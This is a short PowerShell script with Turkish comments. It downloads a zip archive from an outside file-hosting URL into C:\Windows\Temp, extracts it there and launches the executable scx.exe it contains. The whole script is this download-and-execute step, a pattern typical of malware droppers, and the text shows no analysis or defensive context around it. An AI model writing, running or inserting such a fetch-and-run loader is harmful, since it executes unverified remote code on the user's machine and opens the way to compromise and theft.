try {
    $url = "https://fries.bunkr.ru/scx-ZPpMXYAx.zip"
    $downloadPath = "C:\\Windows\\Temp\\downloaded.zip"
    $extractedPath = "C:\\Windows\\Temp\\extracted"

    # Dosyayı indir
    Invoke-WebRequest -Uri $url -OutFile $downloadPath

    # Zip dosyasını çıkar
    Expand-Archive -Path $downloadPath -DestinationPath $extractedPath

    # Çıkarılan dosyayı çalıştır
    Start-Process -FilePath "$extractedPath\scx.exe"
}
catch {
    Write-Host "Hata oluştu: $_"
    exit 1
}